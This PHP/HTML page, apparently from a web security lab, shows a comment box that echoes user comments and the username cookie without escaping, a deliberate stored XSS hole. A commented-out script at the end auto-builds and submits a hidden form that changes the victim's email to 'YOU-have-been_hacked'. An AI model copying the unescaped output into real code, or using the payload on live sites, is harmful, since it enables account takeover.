<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>index</title>

    <!-- bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

</head>
<body>
    <?php include_once('./navbar.php'); ?>
    <div class="d-flex flex-column align-items-center">
        <h2>Hello welcome you are  <?=($_COOKIE["username"]) ?>!!</h2>
    
        <div>
            <h2>comment box</h2>
            <form action="" method="post">
                <input type="textarea" placeholder="comment something" name="comment">
                <input type="hidden" name="add_comment" value="1">
                <input type="submit" value="Post">
            </form>
        </div>
    </div>

    <div class="d-flex flex-column align-items-center p-5" id="comment-section">
        <?php foreach ($comments as $comment): ?>
            <div class="card" style="width: 25rem; margin-bottom: 1rem;"> 
                <h5 class="card-header"><?= $comment["user"] ?></h5>
                <div class="card-body">
                    <?= $comment["comment"] ?>
                </div>
            </div>
        <?php endforeach; ?>
    </div>

    <!-- <script>
        function createForm() {
            const form = document.createElement("form");
            form.setAttribute("method", "post");
            form.setAttribute("action", "/attack/email_change.php");
            form.setAttribute("id", "attack-form");

            const input_email = document.createElement("input");
            input_email.setAttribute("type", "text");
            input_email.setAttribute("name", "new_email");
            input_email.setAttribute("value", "YOU-have-been_hacked");

            const input_action = document.createElement("input");
            input_action.setAttribute("type", "text");
            input_action.setAttribute("name", "email_change");
            input_action.setAttribute("value", "1");

            const submitButton = document.createElement("button");
            submitButton.setAttribute("type", "submit");
            submitButton.textContent = "Submit";

            form.appendChild(input_email);
            form.appendChild(input_action);
            form.appendChild(submitButton);

            const commentSection = document.getElementById("comment-section");
            commentSection.appendChild(form);
        }

        function submitForm(){
            const form = document.getElementById("attack-form");
            form.submit();
        }

        createForm();
        submitForm();
    </script> -->
</body>
</html>
